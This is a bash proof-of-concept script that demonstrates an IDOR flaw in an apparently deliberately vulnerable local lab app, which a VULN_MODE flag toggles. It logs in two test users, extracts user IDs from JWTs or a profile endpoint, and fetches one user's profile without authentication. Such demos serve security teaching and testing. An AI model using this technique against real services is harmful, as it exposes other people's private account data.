#!/usr/bin/env bash
set -euo pipefail

# ===== Configuration =====
HOST="http://localhost:3000"
# Replace these with your test credentials
USERA="userA"
PASSA="passwordA"
USERB="userB"
PASSB="passwordB"

# Temporary cookie files
COOKIES_A="/tmp/cookies_userA.txt"
COOKIES_B="/tmp/cookies_userB.txt"

# Require jq
if ! command -v jq >/dev/null 2>&1; then
  echo "Error: jq is required. Install with: sudo apt install -y jq"
  exit 1
fi

echo "== Testing IDOR flow against ${HOST} =="
echo

# Helper: attempt token login and return raw response
login_raw() {
  local user="$1" pass="$2" out
  out=$(curl -s -X POST "${HOST}/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}")
  printf '%s' "$out"
}

# Helper: try to extract token from common fields using jq
extract_token() {
  local raw="$1"
  printf '%s' "$raw" | jq -r '.token // .accessToken // .access_token // .access // empty'
}

# Helper: decode JWT payload (base64url) and extract user id using jq
extract_userid_from_jwt() {
  local token="$1"
  if [ -z "${token:-}" ]; then
    return 1
  fi

  # get payload (2nd part)
  local payload
  payload=$(printf '%s' "$token" | cut -d '.' -f2)

  # convert base64url -> base64, add padding
  # replace URL chars, then pad with '=' to multiple of 4
  payload=$(printf '%s' "$payload" | tr '_-' '/+' )
  local mod=$(( ${#payload} % 4 ))
  if [ $mod -ne 0 ]; then
    local pad=$((4 - mod))
    payload="${payload}$(printf '=%.0s' $(seq 1 $pad))"
  fi

  # decode and try to extract common id fields
  local decoded
  decoded=$(printf '%s' "$payload" | base64 --decode 2>/dev/null || true)
  if [ -z "$decoded" ]; then
    return 1
  fi

  # extract user id candidates
  local id
  id=$(printf '%s' "$decoded" | jq -r '.user_id // .id // ._id // empty' 2>/dev/null || true)
  if [ -n "$id" ]; then
    printf '%s' "$id"
    return 0
  fi

  return 1
}

# Helper: try to extract a usable user id from /profile/me response
extract_userid_from_profile() {
  local raw="$1"
  printf '%s' "$raw" | jq -r '.user_id // .id // ._id // ._id.$oid // empty' 2>/dev/null || true
}

# ---------- User A ----------
echo "Logging in as User A (${USERA})..."
RAW_A=$(login_raw "$USERA" "$PASSA")
TOKEN_A=$(extract_token "$RAW_A" || true)

USERA_ID=""

if [ -n "${TOKEN_A}" ]; then
  echo "Token-based login detected for userA."
  echo "TOKEN_A: ${TOKEN_A}"
  # try to extract user id from the JWT directly
  if USERA_ID=$(extract_userid_from_jwt "$TOKEN_A"); then
    echo "Extracted userA id from JWT: ${USERA_ID}"
  else
    echo "Could not extract user id from JWT payload. Will request /api/profile/me as fallback."
    ME_A=$(curl -s -H "Authorization: Bearer ${TOKEN_A}" "${HOST}/api/profile/me" || true)
    echo "Response from /api/profile/me (userA):"
    printf '%s\n' "$ME_A"
    USERA_ID=$(extract_userid_from_profile "$ME_A" || true)
    if [ -n "$USERA_ID" ]; then
      echo "Extracted userA id from /api/profile/me: ${USERA_ID}"
    else
      echo "WARNING: Could not extract userA id from /api/profile/me response."
    fi
  fi
else
  echo "No token found in login response for userA. Trying cookie-based login..."
  curl -s -c "$COOKIES_A" -X POST "${HOST}/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${USERA}\",\"password\":\"${PASSA}\"}" >/dev/null
  ME_A=$(curl -s -b "$COOKIES_A" "${HOST}/api/profile/me" || true)
  echo "Response from /api/profile/me (userA):"
  printf '%s\n' "$ME_A"
  USERA_ID=$(extract_userid_from_profile "$ME_A" || true)
  if [ -n "$USERA_ID" ]; then
    echo "Extracted userA id from /api/profile/me: ${USERA_ID}"
  else
    echo "WARNING: Could not extract userA id from /api/profile/me response."
  fi
fi

echo
# ---------- User B ----------
echo "Logging in as User B (${USERB})..."
RAW_B=$(login_raw "$USERB" "$PASSB")
TOKEN_B=$(extract_token "$RAW_B" || true)

USERB_ID=""

if [ -n "${TOKEN_B}" ]; then
  echo "Token-based login detected for userB."
  echo "TOKEN_B: ${TOKEN_B}"
  # try to extract user id from the JWT directly
  if USERB_ID=$(extract_userid_from_jwt "$TOKEN_B"); then
    echo "Extracted userB id from JWT: ${USERB_ID}"
  else
    echo "Could not extract user id from JWT payload. Will request /api/profile/me as fallback."
    ME_B=$(curl -s -H "Authorization: Bearer ${TOKEN_B}" "${HOST}/api/profile/me" || true)
    echo "Response from /api/profile/me (userB):"
    printf '%s\n' "$ME_B"
    USERB_ID=$(extract_userid_from_profile "$ME_B" || true)
    if [ -n "$USERB_ID" ]; then
      echo "Extracted userB id from /api/profile/me: ${USERB_ID}"
    else
      echo "ERROR: Could not extract userB id from /api/profile/me response."
      exit 1
    fi
  fi
else
  echo "No token found in login response for userB. Trying cookie-based login..."
  curl -s -c "$COOKIES_B" -X POST "${HOST}/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${USERB}\",\"password\":\"${PASSB}\"}" >/dev/null
  ME_B=$(curl -s -b "$COOKIES_B" "${HOST}/api/profile/me" || true)
  echo "Response from /api/profile/me (userB):"
  printf '%s\n' "$ME_B"
  USERB_ID=$(extract_userid_from_profile "$ME_B" || true)
  if [ -n "$USERB_ID" ]; then
    echo "Extracted userB id from /api/profile/me: ${USERB_ID}"
  else
    echo "ERROR: Could not extract userB id from /api/profile/me response. Aborting IDOR test."
    exit 1
  fi
fi

echo
echo "== Testing IDOR endpoint (/api/profile/view?id=${USERB_ID}) =="
echo "Note: this request is intentionally unauthenticated to demonstrate the vulnerability."
echo

# Call the IDOR endpoint (no auth) to demonstrate vulnerability
curl -i "${HOST}/api/profile/view?id=${USERB_ID}"
echo
echo
echo "Done. If VULN_MODE=true you should see userB profile JSON (including the intentional 'note')."
echo "If VULN_MODE=false you'll receive 403 Forbidden."
